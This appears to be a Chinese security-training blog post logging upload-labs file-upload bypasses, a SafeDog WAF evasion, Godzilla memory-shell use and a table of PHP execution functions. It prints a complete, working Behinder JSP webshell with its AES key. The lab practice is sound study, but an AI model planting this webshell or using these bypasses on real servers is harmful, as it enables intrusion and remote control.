{"title":"day12-test","uid":"3573bf1d520c4107730189122a19bec7","slug":"day12-test","date":"2025-08-26T07:52:04.000Z","updated":"2025-09-02T07:47:23.518Z","comments":true,"path":"api/articles/day12-test.json","keywords":null,"cover":[],"content":"<h2 id=\"1、通关文件上传靶场1，2，3，4，10关卡\"><a href=\"#1、通关文件上传靶场1，2，3，4，10关卡\" class=\"headerlink\" title=\"1、通关文件上传靶场1，2，3，4，10关卡\"></a>1、通关文件上传靶场1，2，3，4，10关卡</h2><h3 id=\"Pass-01\"><a href=\"#Pass-01\" class=\"headerlink\" title=\"Pass-01\"></a>Pass-01</h3><p>直接上传 .php 文件会发现不让上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826190445871.png\" alt=\"image-20250826190445871\"></p>\n<p>修改文件后缀为 .png ，再次上传，抓包，将后缀改回 .php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826191228834.png\" alt=\"image-20250826191228834\"></p>\n<p>找到上传文件路径，右键点击图片，新的标签页打开</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826191333988.png\" alt=\"image-20250826191333988\"></p>\n<p>找到文件上传的路径为 &#x2F;upload&#x2F;upload&#x2F;1.png ，改成 &#x2F;upload&#x2F;upload&#x2F;1.php </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826191429711.png\" alt=\"image-20250826191429711\"></p>\n<h3 id=\"Pass-02\"><a href=\"#Pass-02\" class=\"headerlink\" title=\"Pass-02\"></a>Pass-02</h3><p>直接上传 .php 文件，文件类型不对，上传失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826192036599.png\" alt=\"image-20250826192036599\"></p>\n<p>抓包修改文件类型为 image&#x2F;jpeg</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826192455349.png\" alt=\"image-20250826192455349\"></p>\n<p>直接访问 &#x2F;upload&#x2F;upload&#x2F;1.php </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826192543455.png\" alt=\"image-20250826192543455\"></p>\n<h3 id=\"Pass-03\"><a href=\"#Pass-03\" class=\"headerlink\" title=\"Pass-03\"></a>Pass-03</h3><p>直接上传 1.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826192619167.png\" alt=\"image-20250826192619167\"></p>\n<p>选择修改后缀，上传 1.phtml 成功上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826192841349.png\" alt=\"image-20250826192841349\"></p>\n<p>如果直接打开 .phtml 文件不能被解析，要修改配置文件，在 httpd.conf 文件里修改，添加一条<code>AddType application/x-httpd-php .phtml .php3</code>，重启服务</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826193654880.png\" alt=\"image-20250826193654880\"></p>\n<p>直接右键访问</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826193513528.png\" alt=\"image-20250826193513528\"></p>\n<h3 id=\"Pass-04\"><a href=\"#Pass-04\" class=\"headerlink\" title=\"Pass-04\"></a>Pass-04</h3><p>由于第四关过滤了很多后缀名，所以先上传一个 .htaccess 文件用来让所有文件都解析为 php 文件</p>\n<p><code>SetHandler application/x-httpd-php</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826194109473.png\" alt=\"image-20250826194109473\"></p>\n<p>将原来的 1.php 改成 1.png 进行上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826194210857.png\" alt=\"image-20250826194210857\"></p>\n<p>直接访问 &#x2F;upload&#x2F;upload&#x2F;1.png</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826194228276.png\" alt=\"image-20250826194228276\"></p>\n<h3 id=\"Pass-10\"><a href=\"#Pass-10\" class=\"headerlink\" title=\"Pass-10\"></a>Pass-10</h3><p>由于检测到后缀名会替换为空，所以使用双写，上传一个 1.pphphp 文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826194927332.png\" alt=\"image-20250826194927332\"></p>\n<p>右键点击访问</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826194951774.png\" alt=\"image-20250826194951774\"></p>\n<h2 id=\"2、将通关关卡后端涉及到的防御函数都自己编写一个文件演示一下函数的作用\"><a href=\"#2、将通关关卡后端涉及到的防御函数都自己编写一个文件演示一下函数的作用\" class=\"headerlink\" title=\"2、将通关关卡后端涉及到的防御函数都自己编写一个文件演示一下函数的作用\"></a>2、将通关关卡后端涉及到的防御函数都自己编写一个文件演示一下函数的作用</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deldot</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$s</span>)-<span class=\"number\">1</span>;<span class=\"variable\">$i</span>&gt;<span class=\"number\">0</span>;<span class=\"variable\">$i</span>--)&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$s</span>,<span class=\"variable\">$i</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"variable\">$i</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$s</span>)-<span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"variable\">$c</span> != <span class=\"string\">&#x27;.&#x27;</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"variable\">$c</span> != <span class=\"string\">&#x27;.&#x27;</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$s</span>,<span class=\"number\">0</span>,<span class=\"variable\">$i</span>+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]);</span><br><span class=\"line\"><span class=\"comment\">//$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span></span><br><span class=\"line\"><span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\"><span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\"><span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$deny_ext</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\"><span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826200241891.png\" alt=\"image-20250826200241891\"></p>\n<h2 id=\"3、尝试绕过安全狗上传一句话木马\"><a href=\"#3、尝试绕过安全狗上传一句话木马\" class=\"headerlink\" title=\"3、尝试绕过安全狗上传一句话木马\"></a>3、尝试绕过安全狗上传一句话木马</h2><p>上传 1.png 然后修改文件后缀发现被安全狗拦截</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826200712987.png\" alt=\"image-20250826200712987\"></p>\n<p>在其中插入一段脏数据，由于安全狗这类安全软件由于响应速度的问题，不会做到每个数据都进行检查，导致文件上传成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826200957836.png\" alt=\"image-20250826200957836\"></p>\n<p>访问 1.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826201131347.png\" alt=\"image-20250826201131347\"></p>\n<h2 id=\"4、使用哥斯拉自己操作一下内存马\"><a href=\"#4、使用哥斯拉自己操作一下内存马\" class=\"headerlink\" title=\"4、使用哥斯拉自己操作一下内存马\"></a>4、使用哥斯拉自己操作一下内存马</h2><p>首先使用 1.jsp 哥斯拉进入，然后创建内存马</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826202252285.png\" alt=\"image-20250826202252285\"></p>\n<p>由于是存在内存中，在文件目录下无法查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826202414709.png\" alt=\"image-20250826202414709\"></p>\n<p>使用哥斯拉进行连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826202506342.png\" alt=\"image-20250826202506342\"></p>\n<p>内存马使用成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826202536408.png\" alt=\"image-20250826202536408\"></p>\n<h2 id=\"5、尝试使用一下冰蝎工具\"><a href=\"#5、尝试使用一下冰蝎工具\" class=\"headerlink\" title=\"5、尝试使用一下冰蝎工具\"></a>5、尝试使用一下冰蝎工具</h2><p>使用以下代码作为 jsp 文件</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">U</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ClassLoader</span> &#123;</span><br><span class=\"line\">U(ClassLoader c) &#123; <span class=\"built_in\">super</span>(c); &#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> Class <span class=\"title function_\">g</span><span class=\"params\">(<span class=\"type\">byte</span>[] b)</span> &#123; <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.defineClass(b, <span class=\"number\">0</span>, b.length); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span> (request.getMethod().equals(<span class=\"string\">&quot;POST&quot;</span>)) &#123;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">k</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;e45e329feb5d925b&quot;</span>; <span class=\"comment\">// 密钥</span></span><br><span class=\"line\">session.putValue(<span class=\"string\">&quot;u&quot;</span>, k);</span><br><span class=\"line\"><span class=\"type\">Cipher</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Cipher.getInstance(<span class=\"string\">&quot;AES&quot;</span>);</span><br><span class=\"line\">c.init(<span class=\"number\">2</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">SecretKeySpec</span>(k.getBytes(), <span class=\"string\">&quot;AES&quot;</span>));</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">U</span>(<span class=\"built_in\">this</span>.getClass().getClassLoader())</span><br><span class=\"line\">.g(c.doFinal(<span class=\"keyword\">new</span> <span class=\"title class_\">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class=\"line\">.newInstance().equals(pageContext);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>使用冰蝎连接，选择加密类型，传输协议，保存</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826203106644.png\" alt=\"image-20250826203106644\"></p>\n<p>连接成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826203321532.png\" alt=\"image-20250826203321532\"></p>\n<h1 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h1><h2 id=\"自主学习一下php语言中有哪些命令执行和代码执行的函数\"><a href=\"#自主学习一下php语言中有哪些命令执行和代码执行的函数\" class=\"headerlink\" title=\"自主学习一下php语言中有哪些命令执行和代码执行的函数\"></a>自主学习一下php语言中有哪些命令执行和代码执行的函数</h2><p>好的，我们来详细梳理一下 PHP 中用于命令执行和代码执行的函数，并重点讨论其安全风险。</p>\n<h3 id=\"一、命令执行函数\"><a href=\"#一、命令执行函数\" class=\"headerlink\" title=\"一、命令执行函数\"></a>一、命令执行函数</h3><table>\n<thead>\n<tr>\n<th align=\"center\">函数</th>\n<th align=\"center\">返回值</th>\n<th align=\"center\">特点</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><strong><code>exec</code></strong></td>\n<td align=\"center\">命令执行的<strong>最后一行</strong>输出</td>\n<td align=\"center\">可以通过第二个参数 <code>$output</code>获取一个数组，包含所有输出行。第三个参数 <code>$return_var</code>获取命令执行的状态码。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>shell_exec</code></strong></td>\n<td align=\"center\"><strong>字符串形式</strong>的完整命令输出</td>\n<td align=\"center\">获取命令执行后输出的所有内容。如果输出是二进制数据（如图片），这是最好的选择。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>system</code></strong></td>\n<td align=\"center\">成功则返回<strong>最后一行</strong>输出，失败返回 <code>false</code></td>\n<td align=\"center\">直接将命令的执行结果<strong>输出到浏览器</strong>（或标准输出），并返回最后一行。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>passthru</code></strong></td>\n<td align=\"center\"><code>void</code>(无返回值)</td>\n<td align=\"center\">直接<strong>原始输出</strong>命令的执行结果到浏览器，常用于执行像 <code>ping</code>这样输出二进制的命令。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>popen</code></strong> &#x2F; <strong><code>proc_open</code></strong></td>\n<td align=\"center\">资源</td>\n<td align=\"center\">更高级的函数，可以建立<strong>管道</strong>连接，进行双向通信（同时写入和读取）。<code>popen</code>是单向的，<code>proc_open</code>更强大，可以控制标准输入、输出、错误。</td>\n</tr>\n</tbody></table>\n<h3 id=\"二、代码执行函数\"><a href=\"#二、代码执行函数\" class=\"headerlink\" title=\"二、代码执行函数\"></a>二、代码执行函数</h3><table>\n<thead>\n<tr>\n<th align=\"center\">函数</th>\n<th align=\"center\">特点</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><strong><code>eval</code></strong></td>\n<td align=\"center\"><strong>语言构造器</strong>，不是函数。直接执行传入的 PHP 代码字符串。<strong>代码必须用分号结尾</strong>。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>assert</code></strong></td>\n<td align=\"center\">原本是用于<strong>调试断言</strong>的，但如果传入字符串参数，也会将其作为 PHP 代码执行。在 PHP 7 中，其行为发生了变化，但在某些情况下仍可执行代码。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>create_function</code></strong></td>\n<td align=\"center\">已<strong>弃用</strong>（PHP 7.2+）。它创建一个匿名函数，但其实现方式是 <strong><code>eval</code></strong> 代码。内部通过拼接字符串并用 <code>eval</code>执行来实现，因此有严重安全风险。</td>\n</tr>\n<tr>\n<td align=\"center\"><strong><code>preg_replace</code></strong> 与 <code>/e</code>修饰符</td>\n<td align=\"center\"><strong>已移除</strong>（PHP 7+）。<code>preg_replace(&#39;/.*/e&#39;, &#39;phpinfo()&#39;, &#39;&#39;);</code>在 PHP 5.x 中，<code>/e</code>修饰符会导致替换字符串被 <code>eval</code>执行。<strong>绝对不要再使用</strong>。</td>\n</tr>\n</tbody></table>\n<h2 id=\"在哥斯拉通信的时候安装wireshark，尝试抓取流量分析一下与普通的webshell流量之间的区别\"><a href=\"#在哥斯拉通信的时候安装wireshark，尝试抓取流量分析一下与普通的webshell流量之间的区别\" class=\"headerlink\" title=\"在哥斯拉通信的时候安装wireshark，尝试抓取流量分析一下与普通的webshell流量之间的区别\"></a>在哥斯拉通信的时候安装wireshark，尝试抓取流量分析一下与普通的webshell流量之间的区别</h2><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250826204523702.png\" alt=\"image-20250826204523702\"></p>\n","text":"1、通关文件上传靶场1，2，3，4，10关卡Pass-01直接上传 .php 文件会发现不让上传 修改文件后缀为 .png ，再次上传，抓包，将后缀改回 .ph...","permalink":"/post/day12-test","photos":[],"count_time":{"symbolsCount":"4.2k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"练习","slug":"练习","count":14,"path":"api/tags/练习.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1%E3%80%81%E9%80%9A%E5%85%B3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA1%EF%BC%8C2%EF%BC%8C3%EF%BC%8C4%EF%BC%8C10%E5%85%B3%E5%8D%A1\"><span class=\"toc-text\">1、通关文件上传靶场1，2，3，4，10关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pass-01\"><span class=\"toc-text\">Pass-01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pass-02\"><span class=\"toc-text\">Pass-02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pass-03\"><span class=\"toc-text\">Pass-03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pass-04\"><span class=\"toc-text\">Pass-04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pass-10\"><span class=\"toc-text\">Pass-10</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%B0%86%E9%80%9A%E5%85%B3%E5%85%B3%E5%8D%A1%E5%90%8E%E7%AB%AF%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E9%98%B2%E5%BE%A1%E5%87%BD%E6%95%B0%E9%83%BD%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%BC%94%E7%A4%BA%E4%B8%80%E4%B8%8B%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">2、将通关关卡后端涉及到的防御函数都自己编写一个文件演示一下函数的作用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3%E3%80%81%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">3、尝试绕过安全狗上传一句话木马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4%E3%80%81%E4%BD%BF%E7%94%A8%E5%93%A5%E6%96%AF%E6%8B%89%E8%87%AA%E5%B7%B1%E6%93%8D%E4%BD%9C%E4%B8%80%E4%B8%8B%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">4、使用哥斯拉自己操作一下内存马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5%E3%80%81%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%8B%E5%86%B0%E8%9D%8E%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">5、尝试使用一下冰蝎工具</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%89%A9%E5%B1%95\"><span class=\"toc-text\">扩展</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%87%AA%E4%B8%BB%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8Bphp%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">自主学习一下php语言中有哪些命令执行和代码执行的函数</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">一、命令执行函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">二、代码执行函数</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9C%A8%E5%93%A5%E6%96%AF%E6%8B%89%E9%80%9A%E4%BF%A1%E7%9A%84%E6%97%B6%E5%80%99%E5%AE%89%E8%A3%85wireshark%EF%BC%8C%E5%B0%9D%E8%AF%95%E6%8A%93%E5%8F%96%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E4%B8%8E%E6%99%AE%E9%80%9A%E7%9A%84webshell%E6%B5%81%E9%87%8F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">在哥斯拉通信的时候安装wireshark，尝试抓取流量分析一下与普通的webshell流量之间的区别</span></a></li></ol>","author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Rust与Java在并发安全上的对比","uid":"1e5549aba23c836b488cd4ec215c029b","slug":"Rust与Java在并发安全上的对比","date":"2025-08-26T12:50:50.000Z","updated":"2025-08-26T12:51:28.044Z","comments":true,"path":"api/articles/Rust与Java在并发安全上的对比.json","keywords":null,"cover":null,"text":"Rust与Java在并发安全上的对比核心安全机制 Rust： 类型系统强制执行： 在编译时由 Rust 编译器严格检查。违反规则会导致编译错误。 并发安全 (S...","permalink":"/post/Rust与Java在并发安全上的对比","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[],"tags":[{"name":"Rust","slug":"Rust","count":2,"path":"api/tags/Rust.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"day11-test","uid":"f09eba89e1a54dd5af837a68dbc3d494","slug":"day11-test","date":"2025-08-25T07:41:09.000Z","updated":"2025-09-02T07:47:14.676Z","comments":true,"path":"api/articles/day11-test.json","keywords":null,"cover":[],"text":"1、通关dvwa靶场三个难度的反射型xssLOW 在输入框中输入<script>alert(/123/)</script>点击Submit提交，页面显示弹窗，内...","permalink":"/post/day11-test","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 